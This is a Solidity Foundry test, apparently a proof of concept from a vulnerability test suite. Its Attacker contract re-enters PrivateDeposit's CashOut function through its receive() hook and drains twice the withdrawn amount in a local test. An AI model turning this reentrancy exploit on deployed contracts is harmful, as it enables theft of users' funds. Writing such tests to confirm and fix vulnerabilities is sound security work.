
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {PrivateDeposit, Log} from "../src/PrivateDeposit.sol";

contract TestReentrancyPrivateDeposit is Test {

    PrivateDeposit public privateDeposit;

    Attacker public _attacker;

    function setUp() public {
        privateDeposit = new PrivateDeposit();
        _attacker = new Attacker(address(privateDeposit));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal >= privateDeposit.MinDeposit());
        vm.assume(attackVal <= type(uint128).max / 2);

        vm.deal(address(privateDeposit), attackVal * 2); 
        vm.deal(address(_attacker), attackVal * 2);
        vm.deal(address(this), attackVal * 2);

        _attacker.setupAttack{value: attackVal * 2}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    PrivateDeposit public victim;

    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public attackVal;

    constructor(address victimAddress) { 
        victim = PrivateDeposit(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        
        attackVal = val;
        victim.Deposit{value: val * 2}();
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;

        victim.CashOut(attackVal);

        exploitSucceeded = (address(this).balance == initialSnapshot + 2 * attackVal) && (attackCallCount == 2);
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            attackCallCount++;
            victim.CashOut(attackVal);
        }
    }
}
